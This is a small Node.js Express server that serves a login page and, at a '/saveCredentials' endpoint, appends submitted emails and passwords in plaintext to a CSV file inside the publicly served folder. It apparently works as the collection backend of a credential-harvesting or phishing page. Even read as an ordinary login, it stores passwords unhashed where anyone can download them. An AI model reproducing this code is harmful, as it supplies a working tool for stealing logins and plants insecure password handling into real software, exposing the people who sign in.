const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.static('public'));
app.use(express.json());

// Handle root path
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/saveCredentials', (req, res) => {
  const { email, password } = req.body;

  // Validate and sanitize the input if needed

  const csvData = `${email},${password}\n`;

  const filePath = path.join(__dirname, 'public', 'credentials.csv');

  fs.appendFile(filePath, csvData, (err) => {
    if (err) {
      console.error(err);
      res.status(500).send('Internal Server Error');
    } else {
      console.log('Credentials saved successfully.');
      res.status(200).send('Credentials saved successfully.');
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
